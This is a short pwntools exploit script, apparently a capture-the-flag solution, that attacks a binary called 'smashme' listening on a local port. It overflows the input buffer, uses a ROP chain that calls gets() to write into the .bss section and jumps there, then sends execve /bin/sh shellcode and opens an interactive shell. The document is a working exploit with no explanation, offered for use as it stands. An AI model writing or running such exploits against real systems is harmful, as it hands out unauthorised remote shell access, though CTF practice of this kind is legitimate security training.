from pwn import *

bin = ELF('./smashme')
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

pop_rdi_ret = 0x004014d6
print('[*] pop_rdi_ret: 0x%016x' % pop_rdi_ret)
bss_addr = bin.bss()
print('[*] bss_addr: 0x%016x' % bss_addr)
gets_symbols = bin.symbols['gets']
print('[*] gets_symbols: 0x%016x' % gets_symbols)

offset = 'Smash me outside, how bout dAAAAAAAAAAA' + 'B'*33
query = offset
query += p64(pop_rdi_ret)
query += p64(bss_addr)
query += p64(gets_symbols)
query += p64(bss_addr)

#proc = process('./smashme')
proc = remote('127.0.0.1', 4444)
proc.recvuntil('Wanna smash?')

proc.sendline(query)
proc.sendline(sc)

proc.interactive()
